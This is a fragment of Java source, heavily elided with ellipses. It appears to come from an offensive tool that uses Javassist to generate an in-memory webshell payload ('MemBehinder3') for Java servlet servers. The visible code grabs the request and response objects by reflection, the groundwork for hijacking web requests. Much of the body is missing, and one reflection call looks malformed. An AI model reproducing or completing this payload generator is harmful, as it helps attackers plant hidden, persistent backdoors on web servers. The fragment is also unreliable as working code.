    ...
    public static byte[] getMemBehinder3Payload(String pass) throws Exception {
        ...
        ctClass.addMethod(CtMethod.make("    public void parseObj(Object obj) {\n" +
               ...
               "                // clazz.setAccessible(true);\n" +
                ...
                "\n" +
                "                    try {\n" +
                "                        java.lang.reflect.Field req = this.request.getClass().getDeclaredField(\"request\",null);\n" +
                ...
                "                        try {\n" +
                "                            this.response = (javax.servlet.http.HttpServletResponse)this.request.getClass().getDeclaredMethod(\"getResponse\").invoke(obj);\n" +
